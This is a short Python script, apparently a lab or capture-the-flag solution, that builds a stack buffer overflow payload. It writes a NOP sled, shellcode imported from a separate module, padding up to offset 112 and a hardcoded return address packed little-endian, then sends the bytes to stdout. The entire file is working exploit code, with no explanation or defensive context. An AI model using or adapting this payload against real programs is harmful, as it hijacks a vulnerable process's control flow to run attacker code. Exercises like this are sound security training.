import sys
import struct
from shellcode import shellcode

toBeOutputted = b""
addressOffset = 112
nopSled = b"\x90"*10
toBeOutputted += nopSled
toBeOutputted += shellcode
padding = b"a"
paddingRequired = padding * (addressOffset - len(nopSled) - len(shellcode))
toBeOutputted += paddingRequired
injectedInstructionsAddress = 0xbffedaf0
injectedInstructionsToEndian = struct.pack("<I", injectedInstructionsAddress)
toBeOutputted += injectedInstructionsToEndian
sys.stdout.buffer.write(toBeOutputted)

